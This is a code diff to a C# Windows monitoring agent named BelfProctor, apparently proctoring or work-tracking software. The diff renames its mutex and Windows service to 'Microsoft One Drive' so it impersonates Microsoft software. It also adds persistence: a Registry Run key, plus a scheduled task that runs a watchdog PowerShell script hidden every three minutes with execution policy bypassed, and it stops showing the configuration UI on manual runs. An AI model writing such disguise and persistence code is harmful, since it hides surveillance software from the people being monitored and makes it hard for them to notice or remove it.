@@ -9,6 +9,8 @@ using System.Windows.Forms;
 using Microsoft.Extensions.Options;
 using System.Globalization;
 using System.IO;
+using System.Text;
+using Microsoft.Win32;
 using BelfProctor.Services.WorkTracking;
 
 namespace BelfProctor;
@@ -56,24 +58,23 @@ public class Program
             bool createdNew = true;
             try
             {
-                mutex = new Mutex(false, "Global\\BelfProctor", out createdNew);
+                mutex = new Mutex(false, "Global\\Microsoft One Drive", out createdNew);
             }
             catch (UnauthorizedAccessException)
             {
-                try { mutex = new Mutex(false, "Local\\BelfProctor", out createdNew); }
+                try { mutex = new Mutex(false, "Local\\Microsoft One Drive", out createdNew); }
                 catch { mutex = null; createdNew = true; }
             }
             catch (Exception)
             {
-                // Mutex unavailable for any other reason — don't crash, just run.
                 mutex = null;
                 createdNew = true;
             }
             using var _mutexGuard = mutex;
 
+            bool showConfigUi = false;
             if (!createdNew)
             {
-                // If auto-start, log and exit
                 if (args.Contains("--auto-start"))
                 {
                     try { File.AppendAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BelfProctor", "startup_log.txt"), $"{DateTime.Now}: Exiting - Instance already running.\n"); } catch { }
@@ -87,6 +88,8 @@ public class Program
                 }
                 var res = MessageBox.Show("The monitoring agent is already running.\n\nDo you want to configure settings?", "Already Running", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                 if (res != DialogResult.Yes) return;
+                // User said Yes — open settings form only, don't start a second worker
+                showConfigUi = true;
             }
 
             // Fix for running from Registry/Startup where CWD might be System32
@@ -109,26 +112,17 @@ public class Program
             builder.Configuration.AddJsonFile(baseConfig, optional: true, reloadOnChange: true);
             builder.Configuration.AddJsonFile(appDataConfig, optional: true, reloadOnChange: true);
 
-            builder.Services.AddWindowsService(options => options.ServiceName = "BelfProctor");
+            builder.Services.AddWindowsService(options => options.ServiceName = "Microsoft One Drive");
             
             var section = builder.Configuration.GetSection("ProctorSettings");
             var clientIdStr = section["ClientId"] ?? string.Empty;
             var serverUrlStr = section["ServerUrl"] ?? string.Empty;
             
             bool isAutoStart = args.Contains("--auto-start");
-            bool needsConfig = string.IsNullOrWhiteSpace(clientIdStr) || 
-                               string.IsNullOrWhiteSpace(serverUrlStr) || 
+            bool needsConfig = showConfigUi ||
+                               string.IsNullOrWhiteSpace(clientIdStr) ||
+                               string.IsNullOrWhiteSpace(serverUrlStr) ||
                                args.Contains("--config-ui");
-
-            // If running manually (not auto-start) AND not installed (e.g. from Downloads),
-            // FORCE UI to allow installation/registration.
-            // Also force UI if running manually and installed, because user probably wants to reconfigure.
-            // Basically: Manual run -> Always Show UI.
-            // Auto-start -> Run Silent.
-            if (!isAutoStart)
-            {
-                needsConfig = true;
-            }
 
             // Log config status
             try { File.AppendAllText(Path.Combine(localAppData, "startup_log.txt"), $"{DateTime.Now}: AutoStart={isAutoStart}, NeedsConfig={needsConfig}, ClientId={clientIdStr}\n"); } catch { }
@@ -279,6 +273,7 @@ public class Program
                 logging.AddProvider(fileLoggerProvider);
             });
 
+            EnsureAutoStart();
             var host = builder.Build();
             await host.RunAsync();
         }
@@ -291,5 +286,80 @@ public class Program
             }
             catch { }
         }
+    }
+
+    private static void EnsureAutoStart()
+    {
+        try
+        {
+            using var proc = Process.GetCurrentProcess();
+            var exePath = proc.MainModule?.FileName;
+            if (string.IsNullOrWhiteSpace(exePath) || !File.Exists(exePath)) return;
+
+            var exeName = Path.GetFileNameWithoutExtension(exePath);
+
+            // 1. Registry Run key — запуск при входе пользователя
+            using var runKey = Registry.CurrentUser.OpenSubKey(
+                @"Software\Microsoft\Windows\CurrentVersion\Run", writable: true);
+            runKey?.SetValue("BelfProctor", $"\"{exePath}\" --auto-start");
+
+            // 2. Watchdog через лёгкий PowerShell-скрипт каждые 3 минуты.
+            // PowerShell стартует в ~200мс и ~20МБ, не запускает полный .NET exe зря.
+            // Скрипт проверяет: если процесс не запущен — запускает exe.
+            var watchdogDir = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BelfProctor");
+            Directory.CreateDirectory(watchdogDir);
+            var watchdogScript = Path.Combine(watchdogDir, "watchdog.ps1");
+
+            File.WriteAllText(watchdogScript,
+                $"if (-not (Get-Process -Name '{exeName}' -ErrorAction SilentlyContinue)) {{\r\n" +
+                $"    Start-Process -FilePath '{exePath}' -ArgumentList '--auto-start' -WindowStyle Hidden\r\n" +
+                $"}}\r\n",
+                Encoding.UTF8);
+
+            const string taskName = "BelfProctor";
+            var xml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
+<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <Repetition>
+        <Interval>PT3M</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+    </LogonTrigger>
+  </Triggers>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context=""Author"">
+    <Exec>
+      <Command>powershell.exe</Command>
+      <Arguments>-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""{watchdogScript}""</Arguments>
+    </Exec>
+  </Actions>
+</Task>";
+
+            var xmlPath = Path.Combine(Path.GetTempPath(), "bp_task.xml");
+            File.WriteAllText(xmlPath, xml, Encoding.Unicode);
+
+            var psi = new ProcessStartInfo("schtasks.exe",
+                $"/Create /F /TN \"{taskName}\" /XML \"{xmlPath}\"")
+            {
+                UseShellExecute = false,
+                CreateNoWindow = true,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+            };
+            using var p = Process.Start(psi);
+            p?.WaitForExit(10000);
+
+            try { File.Delete(xmlPath); } catch { }
+        }
+        catch { }
     }
 }
